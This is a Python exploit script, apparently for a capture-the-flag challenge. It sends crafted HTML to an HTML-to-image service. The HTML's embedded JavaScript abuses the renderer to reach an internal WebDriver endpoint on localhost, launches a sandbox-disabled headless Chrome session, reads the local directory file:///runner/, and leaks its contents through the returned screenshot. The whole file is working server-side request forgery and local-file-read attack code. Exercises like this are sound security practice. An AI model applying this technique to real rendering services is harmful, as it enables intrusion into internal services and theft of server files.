import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=90)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/ss_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return False
        except Exception as e:
            print('retry',e); time.sleep(2)
    return False

# Create a WebDriver session on 40003, navigate to file:///runner/, grab source.
# All async chained; keep pending fetch so screenshot waits for network idle.
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;padding:10px}</style></head><body><div id=o>starting...</div><script>
var out=document.getElementById('o');
function log(m){out.textContent+="\n"+m;}
var B="http://127.0.0.1:40003";
var caps=JSON.stringify({capabilities:{alwaysMatch:{browserName:"chrome","goog:chromeOptions":{args:["--headless=new","--no-sandbox","--disable-dev-shm-usage","--disable-gpu"]}}}});
fetch(B+"/session",{method:"POST",headers:{"Content-Type":"application/json"},body:caps})
.then(function(r){return r.text();})
.then(function(t){
  log("session:"+t.substring(0,150));
  var m=t.match(/"sessionId"\s*:\s*"([^"]+)"/);
  if(!m){log("NO SESSION");return;}
  var sid=m[1];
  return fetch(B+"/session/"+sid+"/url",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:"file:///runner/"})})
  .then(function(){return new Promise(function(res){setTimeout(res,1500);});})
  .then(function(){return fetch(B+"/session/"+sid+"/source");})
  .then(function(r){return r.text();})
  .then(function(src){log("SOURCE:"+src.substring(0,1200));return fetch(B+"/session/"+sid,{method:"DELETE"});});
})
.catch(function(e){log("ERR:"+e);});
</script></body></html>'''
render(js, 'runnerlist')
